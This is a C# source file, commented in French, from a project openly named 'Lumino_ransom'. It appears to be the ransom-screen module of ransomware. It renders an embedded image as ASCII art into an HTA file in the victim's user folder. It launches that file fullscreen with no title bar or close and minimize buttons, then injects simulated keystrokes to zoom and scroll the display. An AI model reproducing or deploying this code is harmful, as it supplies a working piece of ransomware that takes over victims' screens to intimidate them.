/*




 :::       ...    ::  :.        :    ::: :::.    :::.     ...         :::::::..      :::.      :::.    :::.  .::::::.      ...     .        :   
 ;;;       ;;     ;;  ;;,.    ;;;   ;;;` ;;;;,  `;;;  .;;;;;;;.      ;;;;``;;;;     ;;`;;     `;;;;,  `;;;; ;;`    `   .;;;;;;;.  ;;,.    ;;;  
 [[[      [['     [[  [[[[, ,[[[[,  [[[   [[[[[. '[[, [[     \[[,     [[[,/[[['    ,[[ '[[,     [[[[[. '[[' [==/[[[[,, [[     \[[, [[[[, ,[[[[, 
 $$'      $$      $$  $$$$$$$$"$$$  $$$   $$$ "Y$c$$$ $$,     $$$     $$$$$$c     c$$$cc$$$c    $$$ "Y$c$$   '''    $$ $$,     $$$ $$$$$$$$"$$$ 
 88oo,.__ 88    .d88  888 Y88" 888o 888   888    Y88" 888,_ _,88P     888b "88bo,  888   888,   888    Y88  88b    dP" 888,_ _,88P 888 Y88" 888o
 """YUMMM  "YmmMMMM"  MMM  M'  "MMM MMM   MMM     YM   "YMMMMMP"      MMMM   "W"   YMM   ""`    MMM     YM   "YMmMY"    "YMMMMMP"  MMM  M'  "MMM   
     
     __ __             __     
    /\ \\ \          /'__`\   
    \ \ \\ \        /\ \/\ \  
     \ \ \\ \_      \ \ \ \ \ 
      \ \__ ,__\ __  \ \ \_\ \
       \/_/\_\_//\_\  \ \____/
          \/_/  \/_/   \/___/ 
                          




*/
using Lumino_ransom.Properties; // Pour utiliser les ressources du projet Lumino_ransom

using System;                   /*\|---------------------------------------------------------------------------------------------------------------|\*/
using System.Drawing;           /*\|                                                                                                               |\*/
using System.IO;                /*\| Librairie de base (System + Windows.Forms) et Librairie pour images (IO + Drawing) et conversion ASCII (Text) |\*/
using System.Text;              /*\|                                                                                                               |\*/
using System.Windows.Forms;     /*\|---------------------------------------------------------------------------------------------------------------|\*/


// Namespace ASCII
namespace ASCII
{
    // Class ASCII
    internal class ASCII_class
    {
        readonly Lumino_ransom.Properties.Resources Lumino = new Lumino_ransom.Properties.Resources();              // Récupération des paramètres du projet Lumino_ransom
        readonly string userName = Environment.UserName;                                                            // Récupération du nom d'utilisateur
        readonly string userDir = "C:\\Users\\";                                                                    // Récupération du chemin d'accès du dossier utilisateur

        private readonly string[] _AsciiChars = { "#", "#", "@", "%", "=", "+", "*", ":", "-", ".", "&nbsp;" };     // Tableau de caractères spéciaux ASCII que l'on va utiliser
        private string _Content;                                                                                    // Variable de contenu

        //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

        public void ASCII_Art() // Fonction de création de l'image ASCII et de l'affichage de l'image ASCII
        {
            try
            {
                ConvertToAscii_Path();                                                                                     // Appel de la fonction de conversion de l'image en ASCII
                System.Threading.Thread.Sleep(2000);                                                                       // Attendre 2 secondes pour que l'image soit bien converti
                System.Diagnostics.Process.Start(userDir + userName + "\\Lumino.hta");                                     // Ouvrir le fichier HTA depuis le dossier utilisateur
                ASCII_KeyboardModifer();                                                                                   // Appel de la fonction de modification du clavier pour afficher l'image ASCII entièrement
            }
            catch (System.ComponentModel.Win32Exception) { }    // Si le fichier HTA n'est pas trouvé, ne rien faire

        }

        //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        
        public void ConvertToAscii_Path() // Fonction de conversion de l'image en ASCII
        {
            
            try
            {


                // Charger l'image à convertir ( ici, l'image est dans les ressources du projet Lumino_ransom: "Resources.ASCII")
                Bitmap image = new Bitmap(Resources.ASCII);

                //Redimenssionner l'image (ici, 2500 pixels de large) selon la taille que vous voulez avec la fonction GetReSizedImage()
                image = GetReSizedImage(image, 2500);

                //Convertir l'image redimensionnée en ASCII avec la fonction ConvertToAscii()
                _Content = ConvertToAscii(image);
                _Content = "<pre>" + _Content + "</pre>";                                                                                                                                                                                           // Ajouter les balises <pre> pour que l'image soit affichée correctement dans le le fichier HTA (HyperText Application) ou HTLM (HyperText Markup Language), j'ai choisi HTA car il ressemble plus à un fichier .exe qu'à un fichier .html
                StreamWriter sw = new StreamWriter(userDir + userName + "\\Lumino.hta");                                                                                                                                                            // Créer le fichier HTA dans le dossier utilisateur
                sw.Write("<hta:application id=\"oBVC\" \r\napplicationname=\"Lumino\"  \r\nversion=\"1.0\" \r\nmaximizebutton=\"no\" \r\nminimizebutton=\"no\" \r\nsysmenu=\"no\" \r\nCaption=\"no\" \r\nwindowstate=\"maximize\"/> \r");           // Ajouter des informations dans le fichier HTA pour qu'il soit ouvert en plein écran, sans barre de titre, sans bouton de réduction et sans bouton de fermeture
                sw.Write(_Content);                                                                                                                                                                                                                 // Ajouter le contenu de l'image ASCII dans le fichier HTA
                sw.Flush();                                                                                                                                                                                                                         // Vider le tampon
                sw.Close();                                                                                                                                                                                                                         // Fermer le fichier


            }
            catch (System.ComponentModel.Win32Exception) { } // Si l'utilisateur ferme le fichier HTA ou qu'il y a un autre problème, on ne fait rien


        }

        //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

        private Bitmap GetReSizedImage(Bitmap inputBitmap, int asciiWidth) // Fonction pour redimensionner l'image selon la taille que vous voulez
        {

            int asciiHeight;                                                                                // Variable de hauteur
                                                                                                            //Calculer la hauteur de l'image en fonction de la largeur
            asciiHeight = (int)Math.Ceiling((double)inputBitmap.Height * asciiWidth / inputBitmap.Width);   // La hauteur de l'image est égale à la hauteur de l'image divisée par la largeur de l'image multipliée par la largeur de l'image que vous voulez


            Bitmap result = new Bitmap(asciiWidth, asciiHeight);                                            // Créer une nouvelle image avec la largeur et la hauteur calculées précédemment
            Graphics g = Graphics.FromImage((Image)result);                                                 // Créer un nouveau graphique à partir de l'image


            g.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;            // Définir le mode d'interpolation du graphique pour qu'il soit de meilleure qualité
            g.DrawImage(inputBitmap, 0, 0, asciiWidth, asciiHeight);                                        // Dessiner l'image dans le graphique
            g.Dispose();                                                                                    // Libérer les ressources du graphique
            return result;                                                                                  // Retourner l'image redimensionnée


        }

        //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

        private string ConvertToAscii(Bitmap image) // Fonction de conversion de l'image en ASCII (les étapes)
        {

            Boolean toggle = false;                                                    // Variable booléenne pour minimiser la hauteur de l'image
            StringBuilder sb = new StringBuilder();                                    // Créer un nouveau StringBuilder pour stocker le contenu de l'image ASCII

            for (int h = 0; h < image.Height; h++)                                     // Boucle pour parcourir l'image en hauteur
            {
                for (int w = 0; w < image.Width; w++)                               // Boucle pour parcourir l'image en largeur
                {
                    Color pixelColor = image.GetPixel(w, h);                                // Récupérer la couleur des pixels
                    
                                                                                            // Calculer la couleur moyenne du pixel
                                                                                            
                    int red = (pixelColor.R + pixelColor.G + pixelColor.B) / 3;            // La couleur rouge est égale à la somme des couleurs rouge, verte et bleue divisée par 3
                    int green = (pixelColor.R + pixelColor.G + pixelColor.B) / 3;          // La couleur verte est égale à la somme des couleurs rouge, verte et bleue divisée par 3
                    int blue = (pixelColor.R + pixelColor.G + pixelColor.B) / 3;           // La couleur bleue est égale à la somme des couleurs rouge, verte et bleue divisée par 3
                    
                    Color grayColor = Color.FromArgb(red, green, blue);                   // Créer une nouvelle couleur à partir des couleurs moyennes calculées précédemment

                                                                                 // Utiliser la couleur moyenne pour trouver le caractère ASCII correspondant
                    if (!toggle)
                    {
                        int index = (grayColor.R * 10) / 255;                              // La variable index est égale à la couleur rouge multipliée par 10 divisée par 255
                        sb.Append(_AsciiChars[index]);                                     // Ajouter le caractère ASCII correspondant à la variable index dans le StringBuilder
                    }
                }
                if (!toggle)
                {
                    sb.Append("<BR>");                                                    // Ajouter un retour à la ligne dans le StringBuilder
                    toggle = true;                                                        // Changer la valeur de la variable booléenne
                }
                else 
                {
                    toggle = false;                                                      // (Sinon) Changer la valeur de la variable booléenne
                }
            }

            return sb.ToString();   // Retourner le contenu de l'image ASCII convertie en string
        }
    

        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        /*|                                                                                              Fonction 'plaisir' (facultatif)                                                                                    |*/
        public void ASCII_KeyboardModifer() // Fonction que j'appelle 'plaisir' car elle va montrer en détails, à l'utilisateur, toute l'image grace à une simulation d'appuie sur les touches du clavier
        {

            System.Threading.Thread.Sleep(1000);                                                                // Attendre 1 seconde
            SendKeys.Send("^+{SUBTRACT} ^+{SUBTRACT} ^+{SUBTRACT}");                                            // Appuyer sur les touches Ctrl + Moins pour réduire la taille de la fenêtre (3 fois)
            System.Threading.Thread.Sleep(1000);                                                                // Attendre 1 seconde
            SendKeys.Send("{RIGHT}+{RIGHT}+{RIGHT}+{RIGHT}+{RIGHT}+{RIGHT}+{RIGHT}");                           // Appuyer sur les touches Droite pour déplacer la vue vers la droite (7 fois)
            System.Threading.Thread.Sleep(1000);                                                                // Attendre 1 seconde
            SendKeys.Send("{DOWN}+{DOWN}+{DOWN}+{DOWN}+{DOWN}+{DOWN}+{DOWN}+{DOWN}+{DOWN}+{DOWN}+{DOWN}");      // Appuyer sur les touches Bas pour déplacer la vue vers le bas (11 fois)
            System.Threading.Thread.Sleep(3000);                                                                // Attendre 3 secondes
            SendKeys.Send("^+{SUBTRACT}");                                                                      // Appuyer sur les touches Ctrl + Moins pour réduire la taille de la fenêtre (1 fois)
            System.Threading.Thread.Sleep(2000);                                                                // Attendre 2 secondes
            SendKeys.Send("{DOWN}+{DOWN}+{DOWN}+{DOWN}");                                                       // Appuyer sur les touches Bas pour déplacer la vue vers le bas (4 fois)
            System.Threading.Thread.Sleep(1000);                                                                // Attendre 1 seconde
            SendKeys.Send("{UP}+{UP}+{UP}+{UP}+{UP}+{UP}+{UP}");                                                // Appuyer sur les touches Haut pour déplacer la vue vers le haut (7 fois)
            System.Threading.Thread.Sleep(2000);                                                                // Attendre 2 secondes
            SendKeys.Send("{DOWN}+{DOWN}+{DOWN}");                                                              // Appuyer sur les touches Bas pour déplacer la vue vers le bas (3 fois)
            System.Threading.Thread.Sleep(5000);                                                                // Attendre 5 secondes
            SendKeys.Send("^+{ADD}");                                                                           // Appuyer sur les touches Ctrl + Plus pour agrandir la taille de la fenêtre (1 fois)
            System.Threading.Thread.Sleep(1000);                                                                // Attendre 1 seconde
            SendKeys.Send("{LEFT}");                                                                            // Appuyer sur la touche Gauche pour déplacer la vue vers la gauche (1 fois)
            System.Threading.Thread.Sleep(3000);                                                                // Attendre 3 secondes
            SendKeys.Send("{UP}+{UP}+{UP}");                                                                    // Appuyer sur les touches Haut pour déplacer la vue vers le haut (3 fois)
        }

       
        

    }
}
